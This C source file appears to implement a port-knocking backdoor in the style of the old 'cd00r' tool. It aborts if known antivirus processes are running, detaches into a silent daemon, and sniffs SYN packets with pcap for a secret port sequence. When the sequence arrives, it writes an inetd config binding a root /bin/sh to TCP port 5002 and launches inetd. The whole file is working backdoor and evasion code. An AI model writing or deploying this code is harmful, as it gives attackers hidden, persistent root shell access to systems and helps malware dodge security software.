#include "utils.h"

void capterror(pcap_t *caps, char *message) {
    pcap_perror(caps,message);
    exit (-1);
}

void signal_handler(int sig) {
    /* the ugly way ... */
    _exit(0);
}

void *smalloc(size_t size) {
    void	*p;

    if ((p=malloc(size))==NULL) {
	exit(-1);
    }
    memset(p,0,size);
    return p;
}

void check_for_correct_ip(char *ip) {
    char ip_addr[NI_MAXHOST];
    struct ifaddrs *ifaddr, *ifa;
    int s, family;
    unsigned long sockaddr_struct_size;

    if(IP_VERSION == AF_INET) {
        sockaddr_struct_size = sizeof(struct sockaddr_in);
    } else {
        sockaddr_struct_size = sizeof(struct sockaddr_in6);
    }

    if((s = getifaddrs(&ifaddr)) != 0) {
        fprintf(stderr, "getifaddrs() failed: %s\n", strerror(s));
    }

    for(ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        family = ifa->ifa_addr->sa_family;

        if (ifa->ifa_addr == NULL)
            continue;

        if(family != IP_VERSION) {
            continue;
        }
        
        s = getnameinfo(ifa->ifa_addr, sockaddr_struct_size, ip_addr, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
        if (s != 0){
            #ifdef DEBUG
            printf("getnameinfo() failed: %s\n", gai_strerror(s));
            #endif
            exit(EXIT_FAILURE);
        }

        if (strcmp(ip_addr, IPV4_LOOPBACK_ADDR) == 0 || strcmp(ip_addr, IPV6_LOOPBACK_ADDR) == 0)
            continue;

        #ifdef DEBUG
        printf("IPv4 %s: %s\n", ifa->ifa_name, ip_addr);
        #endif

        freeifaddrs(ifaddr);
        
        if(strcmp(ip_addr, ip) == 0) {
            return;
        } else {
            errno = ENXIO;
            fprintf(stderr, "IP address not found\n");
            exit(EXIT_FAILURE);
        }
    }

    fprintf(stderr, "Family not in AF_INET\n");
    exit(EXIT_FAILURE);
}

void check_for_antivirus() {
    FILE *file = popen("ps -A", "r");

    if(!file) {
        fprintf(stderr, "popen failed\n");
        exit(EXIT_FAILURE);
    }

    char buffer[256];
    while(fgets(buffer, sizeof(buffer), file) != NULL) {
        for(int i = 0; i < KNOWN_AV_NUM; i++) {
            if(strstr(buffer, KNOWN_AV_LIST[i]) != NULL) {
                fprintf(stderr, "Antivirus %s found. Abort.\n", KNOWN_AV_LIST[i]);
                pclose(file);
                exit(EXIT_FAILURE);
            }
        }
    }
    
    pclose(file);
    return;
}

void cdr_open_door(void) {
    FILE	*f;

    char	*args[] = {"/usr/sbin/inetd","/tmp/.ind",NULL};

    
    switch (fork()) {
	case -1: 
        #ifdef DEBUG
            printf("fork() failed ! Fuck !\n");
        #endif
	    return;
	case 0: 
	    /* To prevent zombies (inetd-zombies look quite stupid) we do
	     * a second fork() */
	    switch (fork()) {
		case -1: _exit(0);
		case 0: /*that's fine */
			 break;
		default: _exit(0);
	    }
	     break;

	default: 
	     wait(NULL);
	     return;
    }

    if ((f=fopen("/tmp/.ind","a+t"))==NULL) return;
    fprintf(f,"5002  stream  tcp     nowait  root    /bin/sh  sh\n");
    fclose(f);

    execv("/usr/sbin/inetd",args);
    #ifdef DEBUG
        printf("Strange return from execvp() !\n");
    #endif
    exit (0);
}

void create_deamon_process(char *cdr_noise_command) {
    char pcap_err[PCAP_ERRBUF_SIZE]; /* buffer for pcap errors */
    pcap_t *cap; /* captuer handler */
    bpf_u_int32 network, netmask;
    struct pcap_pkthdr *phead;
    struct bpf_program cfilter; /* the compiled filter */
    struct iphdr *ip;
    struct tcphdr *tcp;
    u_char *pdata;

    char *filter;
    char portnum[6];

    int cdr_noise = 0;

    int i;

#ifdef CDR_ADDRESS
    struct hostent	*hent;
#endif  
    
    /* Determines if it will report errors to stderr */
    if(cdr_noise_command) {
        if(!strcmp(cdr_noise_command, CDR_NOISE_COMMAND)) {
            cdr_noise++;
        } else {
            exit(0);
        }
    }

    unsigned int 	cports[] = CDR_PORTS;
    int		cportcnt = 0;
    /* which is the next required port ? */
    int		actport = 0;

    /* Count the number of ports that are defined */
    while (cports[cportcnt++]);
    cportcnt--;    

#ifdef DEBUG
    printf("%d ports used as code\n",cportcnt);
#endif

    if (cports[0]) {
        memset(&portnum,0,6);
        sprintf(portnum,"%d",cports[0]);
        filter=(char *)smalloc(strlen(CDR_BPF_PORT)+strlen(portnum)+1);
        strcpy(filter,CDR_BPF_PORT);
        strcat(filter,portnum);
    } else {
        if (cdr_noise) 
            fprintf(stderr,"NO port code\n");
        exit (0);
    } 

    for (i=1;i<cportcnt;i++) {
        if (cports[i]) {
            memset(&portnum,0,6);
            sprintf(portnum,"%d",cports[i]);
            if ((filter=(char *)realloc(filter,
                    strlen(filter)+
                    strlen(CDR_BPF_PORT)+
                    strlen(portnum)+
                    strlen(CDR_BPF_ORCON)+1))
                ==NULL) {
                if (cdr_noise)
                    fprintf(stderr,"realloc() failed\n");
                exit (0);
            }
            strcat(filter,CDR_BPF_ORCON);
            strcat(filter,CDR_BPF_PORT);
            strcat(filter,portnum);
        }
    } 

#ifdef DEBUG
    printf("DEBUG: '%s'\n",filter);
#endif

    if (pcap_lookupnet(CDR_INTERFACE,&network,&netmask,pcap_err)!=0) {
	    if (cdr_noise)
	        fprintf(stderr,"pcap_lookupnet: %s\n",pcap_err);
	    exit (0);
    }

    /* opens the listener */
    if ((cap=pcap_open_live(CDR_INTERFACE,CAPLENGTH,
		    0,	/*not in promiscuous mode*/
		    0,  /*no timeout */
		    pcap_err))==NULL) {
	    if (cdr_noise)
	        fprintf(stderr,"pcap_open_live: %s\n",pcap_err);
	    exit (0);
    }

    /* compiles the filter and then sets the filter*/
    if (pcap_compile(cap,&cfilter,filter,0,netmask)!=0) {
        if (cdr_noise) 
            capterror(cap,"pcap_compile");
        exit (0);
    }
    if (pcap_setfilter(cap,&cfilter)!=0) {
        if (cdr_noise)
            capterror(cap,"pcap_setfilter");
        exit (0);
    }

    /* the filter is set - let's free the base string*/
    free(filter);

    /* allocate a packet header structure */
    phead=(struct pcap_pkthdr *)smalloc(sizeof(struct pcap_pkthdr));

    signal(SIGABRT,&signal_handler);
    signal(SIGTERM,&signal_handler);
    signal(SIGINT,&signal_handler);

    /* if we don't use DEBUG, let's be nice and close the streams */
#ifndef DEBUG
    fclose(stdin);
    fclose(stdout);
    fclose(stderr);
#endif

    /* create a child process to start a daemon and then exit the parent */
    switch (i=fork()) {
        case -1:
            if (cdr_noise)
            fprintf(stderr,"fork() failed\n");
            exit (0);
            break;	/* not reached */
        case 0:
            /* I'm happy */
	        break;
        default:
            exit (0);
    }

    for(;;) {
    /**
     * This section up until the #ifdef is checking to see if the packet that
     * we captured is a SYN packet and it is IPv4. If it is not a SYN packet 
     * we continue and dont bother with it.
    */

	/* if there is no 'next' packet in time, continue loop */
	if ((pdata=(u_char *)pcap_next(cap,phead))==NULL) continue;
	/* if the packet is to small, continue loop */
	if (phead->len<=(ETHLENGTH+IP_MIN_LENGTH)) continue; 
	
	/* make it an ip packet */
	ip=(struct iphdr *)(pdata+ETHLENGTH);
	/* if the packet is not IPv4, continue */
	if ((unsigned char)ip->version!=4) continue;
	/* make it TCP */
	tcp=(struct tcphdr *)(pdata+ETHLENGTH+((unsigned char)ip->ihl*4));

	/* FLAG check's - see rfc793 */
	/* if it isn't a SYN packet, continue */
	if (!(ntohs(tcp->rawflags)&0x02)) continue;
	/* if it is a SYN-ACK packet, continue */
	if (ntohs(tcp->rawflags)&0x10) continue;

#ifdef CDR_ADDRESS
	/* if the address is not the one defined above, let it be */
	if (hent) {
#ifdef DEBUG
	    if (memcmp(&ip->daddr,hent->h_addr_list[0],hent->h_length)) {
		printf("Destination address mismatch\n");
		continue;
	    }
#else 
	    if (memcmp(&ip->daddr,hent->h_addr_list[0],hent->h_length)) 
		continue;
#endif DEBUG
	}
#endif

	/* it is one of our ports, it is the correct destination 
	 * and it is a genuine SYN packet - let's see if it is the RIGHT
	 * port */

	if (ntohs(tcp->dest_port)==cports[actport]) {
#ifdef DEBUG
	    printf("Port %d is good as code part %d\n",ntohs(tcp->dest_port),
		    actport);
#endif
#ifdef CDR_SENDER_ADDR
	    /* check if the sender is the same */
	    if (actport==0) {
		memcpy(&sender,&ip->saddr,4);
	    } else {
		if (memcmp(&ip->saddr,&sender,4)) { /* sender is different */
		    actport=0;
#ifdef DEBUG
		    printf("Sender mismatch\n");
#endif
		    continue;
		}
	    }
#endif
	    /* it is the rigth port ... take the next one
	     * or was it the last ??*/
	    if ((++actport)==cportcnt) {
		/* BINGO */
		cdr_open_door();
		actport=0;
	    } /* ups... some more to go */
	} else {
#ifdef CDR_CODERESET
	    actport=0;
#endif
	    continue;
	}
    } /* end of main loop */

    /* this is actually never reached, because the signal_handler() does the 
     * exit.
     */
    return 0;
}